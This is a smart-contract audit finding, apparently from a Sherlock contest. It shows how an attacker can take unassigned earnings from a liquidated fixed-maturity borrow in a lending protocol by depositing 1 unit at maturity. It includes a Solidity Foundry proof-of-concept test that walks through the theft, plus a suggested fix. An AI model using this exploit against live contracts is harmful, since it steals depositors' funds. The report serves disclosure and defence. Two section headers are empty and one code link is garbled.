---
id: 25169
severity: "Crit/High"
---

# Unassigned pool earnings can be stolen when a maturity borrow is liquidated by depositing at maturity with 1 principal

## Description



## Proof of Concept

## Vulnerability Detail

On `Market::liquidate()`, borrowed maturities will be liquidated first by calling `Market::noTransferRepayAtMaturity()`, passing in the `canDiscount` variable as `false`, so unassigned earnings in the pool will not be converted to `earningsAccumulator` and subtracted to `actualRepayAssets`. Following the liquidation, these unassigned earnings will be converted over time to `floatingAssets`, in `pool.accrueEarnings(maturity);` on deposit, borrow and repay maturities. Or, in case `floatingBackupBorrowed > 0`, the next user to deposit a maturity will partially or fully claim the fee, depending on how much deposit they supply. In case `floatingBackupBorrowed == 0`, and `supply` is 0, the user may borrow at maturity 1 principal and then deposit at maturity 1 principal, claiming the full fee. If `supply` is not 0, the user would have to borrow at maturity until the borrow amount becomes bigger than the supply, which would be less profitable (depending on the required borrowed), but still exploitable.

The following POC added to test `Market.t.sol` shows how an attacker can claim a liquidated borrowed maturity fee with just 1 principal of deposit.

```solidity
function test_POC_stolenBorrowedMaturityEarnings() public {
  uint256 maturity = FixedLib.INTERVAL;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, assets);

  vm.startPrank(ALICE);

  // ALICE deposits
  market.deposit(assets, ALICE);

  // ALICE borrows at maturity, using backup from the deposit
  market.borrowAtMaturity(maturity, assets/10, type(uint256).max, ALICE, ALICE);

  // ALICE borrows the maximum possible using floating rate
  (uint256 collateral, uint256 debt) = auditor.accountLiquidity(address(ALICE), Market(address(0)), 0);
  uint256 borrow = (collateral - debt)*8/10; // max borrow capacity
  market.borrow(borrow, ALICE, ALICE);

  vm.stopPrank();

  skip(1 days);

  // LIQUIDATOR liquidates ALICE, wiping ALICE'S maturity borrow
  // and ignores its unassigned rewards
  address liquidator = makeAddr("liquidator");
  vm.startPrank(liquidator);
  deal(address(asset), liquidator, assets);
  asset.approve(address(market), assets);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ATTACKER deposits to borrow at maturity
  address attacker = makeAddr("attacker");
  deal(address(asset), attacker, 20);
  vm.startPrank(attacker);
  asset.approve(address(market), 20);
  market.deposit(10, attacker);

  // ATTACKER borrows at maturity, making floatingBackupBorrowed = 1 > supply = 0
  market.borrowAtMaturity(maturity, 1, type(uint256).max, attacker, attacker);

  // ATTACKER deposits just 1 at maturity, claiming all the unassigned earnings
  // by only providing 1 principal
  uint256 positionAssets = market.depositAtMaturity(maturity, 1, 0, attacker);
  assertEq(positionAssets, 6657534246575341801);
}
```

## Impact

Attacker steals the unassigned earnings from the liquidation of a borrowed maturity with 1 principal.

## Code Snippet

[https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L244](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L244>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L293](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L293>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L375](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L375>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L478](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L478>) [https://github.com/sherlock-aaccrueudit/2024-04-interest-rate-model-0x73696d616f/blob/main/protocol/contracts/Market.sol#L508](<https://github.com/sherlock-aaccrueudit/2024-04-interest-rate-model-0x73696d616f/blob/main/protocol/contracts/Market.sol#L508>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L565](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L565>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/utils/FixedLib.sol#L84](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/utils/FixedLib.sol#L84>)

## Recommendation

Instead of ignoring unassigned earnings on liquidations, convert them to `earningsAccumulator`, which should not be able to be gamed as it goes through an over time accumulator.
